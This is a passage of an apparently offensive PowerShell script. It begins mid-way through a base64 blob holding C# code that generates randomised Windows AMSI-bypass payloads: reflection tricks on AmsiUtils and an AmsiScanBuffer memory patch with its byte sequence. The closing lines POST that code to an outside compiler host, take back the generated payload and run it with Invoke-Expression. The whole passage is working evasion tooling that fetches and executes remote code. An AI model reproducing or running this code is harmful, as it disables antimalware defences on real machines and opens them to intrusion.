XVvdDsjTWF0dCBHcmFlYmVycyBSZWZsZWN0aW9uIG1ldGhvZCB3aXRoIFdNRjUgYXV0b2xvZ2dpbmcgYnlwYXNzIFxcbltEZWxlZ2F0ZV06OkNyZWF0ZURlbGVnYXRlKChcXCZxdW90O0Z1bmNgYDNbU3RyaW5nLCAkKChbU3RyaW5nXS5Bc3NlbWJseS5HZXRUeXBlKCYjeDI3O1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFncyYjeDI3OykpLkZ1bGxOYW1lKSwgU3lzdGVtLlJlZmxlY3Rpb24uRmllbGRJbmZvXVxcJnF1b3Q7IC1hcyBbU3RyaW5nXS5Bc3NlbWJseS5HZXRUeXBlKCYjeDI3O1N5c3RlbS5UeXBlJiN4Mjc7KSksIFtPYmplY3RdKFtSZWZdLkFzc2VtYmx5LkdldFR5cGUoXFwmcXVvdDtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlsc1xcJnF1b3Q7KSksKCYjeDI3O0dldEZpZWxkJiN4Mjc7KSkuSW52b2tlKCYjeDI3O2Ftc2lJbml0RmFpbGVkJiN4Mjc7LCgoXFwmcXVvdDtOb25QdWJsaWMsU3RhdGljXFwmcXVvdDspIC1hcyBbU3RyaW5nXS5Bc3NlbWJseS5HZXRUeXBlKCYjeDI3O1N5c3RlbS5SZWZsZWN0aW9uLkJpbmRpbmdGbGFncyYjeDI3OykpKS5TZXRWYWx1ZSgkbnVsbCwkVHJ1ZSk7JnF1b3Q7O1xuXG4gICAgICAgIC8vVXNpbmcgTWF0dCBHcmFlYmVycyBzZWNvbmQgUmVmbGVjdGlvbiBtZXRob2RcbiAgICAgICAgdmFyIE1hdHRHcmVmMDIgPSAmcXVvdDsjTWF0dCBHcmFlYmVycyBzZWNvbmQgUmVmbGVjdGlvbiBtZXRob2QgXFxuW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjooXFwmcXVvdDtXcml0ZUludDMyXFwmcXVvdDspKFtSZWZdLkFzc2VtYmx5LkdldFR5cGUoXFwmcXVvdDtTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLkFtc2lVdGlsc1xcJnF1b3Q7KS5HZXRGaWVsZChcXCZxdW90O2Ftc2lDb250ZXh0XFwmcXVvdDssW1JlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXVxcJnF1b3Q7Tm9uUHVibGljLFN0YXRpY1xcJnF1b3Q7KS5HZXRWYWx1ZSgkbnVsbCksMHgmcXVvdDsgKyByYW5kb20uTmV4dCgwLCBpbnQuTWF4VmFsdWUpLlRvU3RyaW5nKCZxdW90O1gmcXVvdDspICsgJnF1b3Q7KTsmcXVvdDs7XG5cbiAgICAgICAgLy9Vc2luZyByYXN0YS1tb3VzZXMgQW1zaVNjYW5CdWZmZXJCeXBhc3MgZnJvbSBodHRwczovL2dpdGh1Yi5jb20vcmFzdGEtbW91c2UvQW1zaVNjYW5CdWZmZXJCeXBhc3MvYmxvYi9tYXN0ZXIvQVNCQnlwYXNzLnBzMVxuICAgICAgICB2YXIgUmFzdGFCdWYgPSBFbmNvZGluZy5VVEY4LkdldFN0cmluZyhDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoJnF1b3Q7STFKaGMzUmhMVzF2ZFhObGN5QkJiWE5wTFZOallXNHRRblZtWm1WeUlIQmhkR05vSUNoa2FYTnJiR1Z6Y3lrS0pFeHZZV1JNYVdKeVlYSjVJRDBnVzFONWMzUmxiUzVVWlhoMExrVnVZMjlrYVc1blhUbzZWVlJHT0M1SFpYUlRkSEpwYm1jb1cxTjVjM1JsYlM1RGIyNTJaWEowWFRvNlJuSnZiVUpoYzJVMk5GTjBjbWx1WnlnaVZFYzVhRnBGZUhCWmJrcG9ZMjVyUFNJcEtRb2tSMlYwVUhKdlkwRmtaSEpsYzNNZ1BTQmJVM2x6ZEdWdExsUmxlSFF1Ulc1amIyUnBibWRkT2pwVlZFWTRMa2RsZEZOMGNtbHVaeWhiVTNsemRHVnRMa052Ym5abGNuUmRPanBHY205dFFtRnpaVFkwVTNSeWFXNW5LQ0pTTWxZd1ZVaEtkbGt3Um10YVNFcHNZek5OUFNJcEtRb2tWbWx5ZEhWaGJGQnliM1JsWTNRZ1BTQmJVM2x6ZEdWdExsUmxlSFF1Ulc1amIyUnBibWRkT2pwVlZFWTRMa2RsZEZOMGNtbHVaeWhiVTNsemRHVnRMa052Ym5abGNuUmRPanBHY205dFFtRnpaVFkwVTNSeWFXNW5LQ0pXYld4NVpFaFdhR0pHUW5saU0xSnNXVE5SUFNJcEtRb2tRVk5DUWtGUVNTQTlJQ0pVVm5GUlFVRk5RVUZCUVVWQlFVRkJMeTg0UVVGTVowRkJRVUZCUVVGQlFWRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRV2RCUVVGQlFUUm1kV2MwUVhSQmJrNUpZbWRDVkUwd2FGWkhhSEJqZVVKM1kyMDVibU50Um5SSlIwNW9ZbTAxZG1SRFFtbGFVMEo1WkZjMFoyRlhOR2RTUlRsVVNVY3hkbHBIVlhWRVVUQkxTa0ZCUVVGQlFVRkJRVUpSVWxGQlFWUkJSVVJCU3poVVowZEJRVUZCUVVGQlFVRkJRVTlCUVVGcFJVeEJVWE5CUVVGWlFVRkJRVWRCUVVGQlFVRkJRVWhwVVVGQlFVRm5RVUZCUVZGQlFVRkJRVUZCUlVGQlowRkJRVUZCWjBGQlFrRkJRVUZCUVVGQlFVRkZRVUZCUVVGQlFVRkJRVU5CUVVGQlFVRm5RVUZCUVVGQlFVRk5RVkZKVlVGQlFrRkJRVUpCUVVGQlFVRkZRVUZCUlVGQlFVRkJRVUZCUWtGQlFVRkJRVUZCUVVGQlFVRkJRVTFSYWtGQlFsaEJRVUZCUVVWQlFVRkxRVU5CUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJSMEZCUVVGM1FVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCU1VGQlFVTkJRVUZCUVVGQlFVRkJRVUZCUVVGRFEwRkJRVVZuUVVGQlFVRkJRVUZCUVVGQlFVRkROVEJhV0dnd1FVRkJRVXBCVVVGQlFVRm5RVUZCUVVKblFVRkJRVWxCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZEUVVGQlIwRjFZMjVPZVZsM1FVRkJTMEZEUVVGQlFWRkJRVUZCUVZGQlFVRkJTVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUpCUVVGQ1FVeHVTbXhpUnpscVFVRkJUVUZCUVVGQlIwRkJRVUZCUTBGQlFVRkVRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVkZCUVVGUlowRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZLUVVGQlFVRkJRVUZGWjBGQlFVRkRRVUZWUVZWRFFVRkJTRkZFUVVGQlFrRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkZTbFJUYTBsQ1FVRkZRVUZCUVVGQlFYZEJRVUZDTWs1RE5IZE1hazEzVFhwRk5VRkJRVUZCUVZWQllrRkJRVUZGWjBKQlFVRnFabWRCUVhSQlJVRkJSbEZDUVVGQmFsVXpVbmxoVnpWdVkzZEJRVUZCUVVsQmQwRkJRMEZCUVVGRFRsWlZkMEZSUVhkQlFVVkJRVUZCUTA1SVZsVnNSVUZCUVVGSlFVMUJRVVpSUVVGQlFXcFJiWGgyV1dkQlFVRkJRVUZCUVVGRFFVRkJRbEo0VlVGR1FXdEJRVUZCUVN0cFZYcEJRbGxCUVVGRlFVRkJRVVpCUVVGQlFXZEJRVUZCVFVGQlFVRklRVUZCUVVKQlFVRkJRVWxCUVVGQlFrRkJRVUZCZDBGQlFVRkZRVUZCUVVKQlFVRkJRVUZCUzBGQlJVRkJRVUZCUVVGWlFVeG5RVzVCUVZsQmQxRkRhVUZCV1VFNVFVUlZRVUZaUVVaQlNGVkJRVmxCVFdkSGFVRkJRVUZCUVVGQ1FVRkJRVUZCUVVKQlFVVkJaMUZGVVVGQ1dVRkJRVUZHUVVGRlFVRlJRVUZCUVVGQlowRkRWMGxFVlVGRFowRkNRVUZCUVVGQlEwRkJTbGxuVWtGQlVVRkJUVUZCUVVGQlFVbEJRV3hwUWxGQlFsVkJRa0ZCUVVGQlJVRllkMEZCUVVGSlFWcDNRVUZCUVVWQlkwRkJRVUZCUlVGa1VVRkJRVUZKUVdaM1FVRkJRVTFCYUdkQlEwRkJVVUZyZDBGU1FVMDBRVWhuUVZwQlRUUkJTV2RCYUVGTk5FRklaMEZ3UVUwMFFVcDNRWFZCUWsxQlRFRkJkVUZDYzBGT1VVSkdRVkZCUWtGM1FURkJRVVZCUVVGRlJrRkZVVUZCVVVGQlFWRmpRVlZCUVVKQlFWTkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUWxsQlFVRkJSVUZCUVVGQlFVRkJRVUZCUVVGQlFVSkJRalJCUVVGQlFVRkJRVUZCUVVGQlVFVXhkbHBJVm5OYVZEUkJVVlpPUTFGclJsRlRVelZyWWtkM1FWRldUa05SYTBaUlUxRkNkR015VG5aamJYaHdXV2RDVkdWWVRqQmFWekJCVkRKS2NWcFhUakJCUldSc1pFWkNlV0l5VGtKYVIxSjVXbGhPZWtGRmVIWlpWMUpOWVZkS2VWbFlTalZCUmxwd1kyNVNNVmxYZUZGamJUa3dXbGRPTUVGSGFFNWlNbEl4WWtkVlFXTklTblpaTURWb1lsZFZRV0p0Um5SYVVVSnpZMFZHYTFwSVNteGpNMDFCV2toa1ZHRlljR3hCUjFwelZHMVdNMVZJU25aa1IxWnFaRUZDYzJOSFduTlVNbmhyVlVoS2RtUkhWbXBrUVVKVVpWaE9NRnBYTUhWVmJsWjFaRWRzZEZwVE5VcGlibEpzWTIwNWQxVXlWbmxrYld4cVdsaE5RVlF6VmpCUldGSXdZMjFzYVdSWVVteEJRelZxWkVjNWVVRkdUalZqTTFKc1lsTTFVMlJYTlRCaFZ6RnNUR3RPZG1KWVFuQmlSMVo1VlRKV2VXUnRiR3BhV0UxQlVUSTVkR05IYkhOWldGSndZakkxVTFwWGVHaGxSMFl3WVZjNWRXTXdSakJrU0Vwd1dXNVdNRnBSUWxOa1Z6VXdZVmN4YkZFeU9YUmpSMFl3WVZkS2NHSkhiREJsVlVZd1pFaEtjRmx1VmpCYVVVSkZZa2Q0U21KWVFuWmpibEpDWkVoU2VXRlhTakZrUjFWQllUSldlV0p0Vm5OTmVrbDFXa2Q0YzBGQlFVRkJRVTFuUVVGQlFVRkJRMmQ2WTNCUk9YRmxXRkphUkVkM1FtZG1SVWhST1VGQmFUTmxiSGhYUjFSVVoybFJWVUZCYUdkWlJHZFJRVUZTWjA5RFFVRkZRV2huV2tOU1FVcEJlVUZCUVZGUlowRlJSVWxDUTBGQ1FWRTBTVUZSUVVsQlFVRkJRVUZCWlVGUlFVSkJSbEZEUm14a2VWbFlRazlpTWpWR1pVZE9iR05JVW5CaU1qVlZZVWhLZG1RelRVSTNRMDFCUVVGQlFVRkJRVUZCUVVGQlJHbFJRVUZCUVdkQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJhMEZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRbVpSTWpsNVVrZDRjMVJYUm5CaVowSjBZekpPZG1OdFZteE1iVkp6WWtGQlFVRkJRVUV2ZVZWQlNVRkJVVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVVkJSVUZCUVVGQ1owRkJTVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUlVGQlVVRkJRVVJCUVVGSlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkZRVUZCUVVGQlJXZEJRVUZDV1ZGQlFVRlNRVWxCUVVGQlFVRkJRVUZCUVVGQlVrRkpNRUZCUVVGV1owSlVRVVk0UVZablFrWkJSa2xCVlhkQ1NrRkZPRUZVWjBKbVFVVnJRVlJuUWtkQlJUaEJRVUZCUVVGTU1FVTNMelJCUVVGRlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVVE0UVVGQlFVRkJRVUZCUWtGQlFVRkJTVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZDUlVGQlFVRkJVVUpYUVVkRlFXTm5Ra2RCUjJ0QllrRkNiRUZGYTBGaVowSnRRVWM0UVVGQlFVRkJRMUZCUWtGQlFVRkdVVUZqWjBKb1FVYzBRV04zUW5OQlIwVkJaRUZDY0VGSE9FRmlaMEZCUVVGQlFVRkJRM2RDUzFGQ1FVRkJRa0ZHVFVGa1FVSjVRVWRyUVdKblFtNUJSVmxCWVZGQ2MwRkhWVUZUVVVKMVFVZFpRV0ozUVVGQlNVRkNRVUZCUWtGRVFVRk5RVUYzUVVSQlFVMUJRVEJCUjBsQlRVRkJRVUZEZDBGQlowRkNRVVZaUVdGUlFuTkJSMVZCVWtGQ2JFRklUVUZaZDBKNVFVZHJRV05CUWpCQlIydEJZbmRDZFVGQlFVRkJRVUZuUVVGQlFVMUJRVWxCUVVWQlVtZENjRUZIZDBGYVVVSlhRVWRWUVdOblFucEJSMnRCWW5kQ2RVRkJRVUZCUVVGM1FVTTBRVTFCUVhWQlJFRkJUR2RCZDBGQlFVRlBRVUZOUVVGRlFWTlJRblZCU0ZGQldsRkNlVUZITkVGWlVVSnpRVVUwUVZsUlFuUkJSMVZCUVVGQ1FrRkdUVUZSWjBKRFFVVkZRVlZCUWtwQlF6UkJXa0ZDYzBGSGQwRkJRVUZ2UVVGSlFVRlJRazFCUjFWQlduZENhRUZIZDBGUmQwSjJRVWhCUVdWUlFubEJSMnRCV25kQ2IwRklVVUZCUVVGblFVRkJRVkZCUVUxQlFVVkJWSGRDZVVGSGEwRmFkMEp3UVVjMFFWbFJRbk5CUlZsQllWRkNjMEZIVlVGaVowSm9RVWN3UVZwUlFVRkJSVVZCVlhkQ1EwRkZTVUZSVVVKUlFVVnJRVXhuUW10QlIzZEJZa0ZCUVVGRVVVRkRRVUZDUVVaQlFXTm5RblpCUjFGQlpGRkNha0ZJVVVGV1owSnNRVWhKUVdOM1FuQkJSemhCWW1kQlFVRkVRVUZNWjBGM1FVTTBRVTFCUVhWQlJFRkJRVUZCTkVGQlowRkJVVUpDUVVoTlFXTjNRbXhCUnpCQldXZENjMEZJYTBGSlFVSlhRVWRWUVdOblFucEJSMnRCWW5kQ2RVRkJRVUZOUVVGMVFVUkJRVXhuUVhkQlF6UkJUVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVOQlFVRkJkMEZCUVVGblRrRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUZCUVVGQlFVRkJRVUU5SWdwYlVtVm1iR1ZqZEdsdmJpNUJjM05sYldKc2VWMDZPa3h2WVdRb1cwTnZiblpsY25SZE9qcEdjbTl0UW1GelpUWTBVM1J5YVc1bktDUkJVMEpDUVZCSktTa0tKRU5oYkd4QlUwSkNRVkJKSUQwZ0ppQW9XM05qY21sd2RHSnNiMk5yWFRvNlEzSmxZWFJsS0Z0VGVYTjBaVzB1VkdWNGRDNUZibU52WkdsdVoxMDZPbFZVUmpndVIyVjBVM1J5YVc1bktGdFRlWE4wWlcwdVEyOXVkbVZ5ZEYwNk9rWnliMjFDWVhObE5qUlRkSEpwYm1jb0lsY3dSbFJSYTBwQ1ZVVnNaQ0lwS1NrcENpUk1hV0pNYjJGa0lEMGdKRU5oYkd4QlUwSkNRVkJKT2pva1RHOWhaRXhwWW5KaGNua29JbUZ0YzJrdVpHeHNJaWtLSkUxbGJVRmtjaUE5SUNSRFlXeHNRVk5DUWtGUVNUbzZKRWRsZEZCeWIyTkJaR1J5WlhOektDUk1hV0pNYjJGa0xDQWlRVzF6YVZOallXNUNkV1ptWlhJaUtRb2tjQ0E5SURBS0pFTmhiR3hCVTBKQ1FWQkpPam9rVm1seWRIVmhiRkJ5YjNSbFkzUW9KRTFsYlVGa2Npd2dXM1ZwYm5Rek1sMDFMQ0F3ZURRd0xDQmJjbVZtWFNSd0tRb2tkbUZ5TVNBOUlDSXdlRUk0SWdva2RtRnlNaUE5SUNJd2VEVTNJZ29rZG1GeU15QTlJQ0l3ZURBd0lnb2tkbUZ5TkNBOUlDSXdlREEzSWdva2RtRnlOU0E5SUNJd2VEZ3dJZ29rZG1GeU5pQTlJQ0l3ZUVNeklnb2tVR0YwWTJnZ1BTQmJRbmwwWlZ0ZFhTQW9KSFpoY2pFc0pIWmhjaklzSkhaaGNqTXNKSFpoY2pRc0t5UjJZWEkxTENza2RtRnlOaWtLVzFONWMzUmxiUzVTZFc1MGFXMWxMa2x1ZEdWeWIzQlRaWEoyYVdObGN5NU5ZWEp6YUdGc1hUbzZRMjl3ZVNna1VHRjBZMmdzSURBc0lDUk5aVzFCWkhJc0lEWXAmcXVvdDspKTtcblxuICAgICAgICAvL1NlbGVjdCBhIHJhbmRvbSBtZXRob2RcbiAgICAgICAgc3dpdGNoIChSYW5kb21OdW1iZXIoMSwgNikpXG4gICAgICAgIHtcbiAgICAgICAgICAgIGNhc2UgMTpcbiAgICAgICAgICAgICAgICByZXR1cm4gZW5jb2RlUGF5bG9hZChNYXR0R1JlZmwpO1xuICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgIHJldHVybiBlbmNvZGVQYXlsb2FkKE1hdHRHUmVmbExvZyk7XG4gICAgICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZVBheWxvYWQoTWF0dEdyZWYwMik7XG4gICAgICAgICAgICBjYXNlIDQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZVBheWxvYWQoRm9yY2VFcnJlciwgdHJ1ZSk7XG4gICAgICAgICAgICBjYXNlIDU6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZXJhc3RhKFJhc3RhQnVmKTtcbiAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgcmV0dXJuIGVuY29kZVBheWxvYWQoTWF0dEdSZWZsKTtcbiAgICAgICAgfVxuICAgIH1cbiAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbigpIHsgXG4gICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKEdlbmVyYXRlKCkpO1xuICAgIH1cblxufVxuIiwiT3JpZ2luYWxDb2RlQmxvY2siOiJ1c2luZyBTeXN0ZW07XG5cdFx0XHRcdFx0XG5wdWJsaWMgY2xhc3MgUHJvZ3JhbVxue1xuXHRwdWJsaWMgc3RhdGljIHZvaWQgTWFpbigpXG5cdHtcblx0XHRDb25zb2xlLldyaXRlTGluZShcIkhlbGxvIFdvcmxkXCIpO1xuXHR9XG59IiwiTGFuZ3VhZ2UiOiJDU2hhcnAiLCJDb21waWxlciI6Ik5ldENvcmUyMiIsIlByb2plY3RUeXBlIjoiQ29uc29sZSIsIk9yaWdpbmFsRmlkZGxlSWQiOiJDc0NvbnNDb3JlIiwiTnVHZXRQYWNrYWdlVmVyc2lvbklkcyI6IiIsIk9yaWdpbmFsTnVHZXRQYWNrYWdlVmVyc2lvbklkcyI6IiIsIlRpbWVPZmZzZXQiOiI3IiwiQ29uc29sZUlucHV0TGluZXMiOltdLCJNdmNWaWV3RW5naW5lIjoiUmF6b3IiLCJNdmNDb2RlQmxvY2siOnsiTW9kZWwiOiIiLCJWaWV3IjoiIiwiQ29udHJvbGxlciI6IiJ9LCJPcmlnaW5hbE12Y0NvZGVCbG9jayI6eyJNb2RlbCI6IiIsIlZpZXciOiIiLCJDb250cm9sbGVyIjoiIn0sIlVzZVJlc3VsdENhY2hlIjpmYWxzZX0="
$jsonpostrequest = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$jsonpostrequestbase64"))
$sendrequest = Invoke-WebRequest -Uri $destinationaddr -Method POST -Body $jsonpostrequest -ContentType "application/json"
$parsedoutput = ((($sendrequest.Content | ConvertFrom-Json | Select ConsoleOutput) -replace "@{ConsoleOutput=", "") -replace '\r?\n[^\n]*\Z')
Invoke-Expression $parsedoutput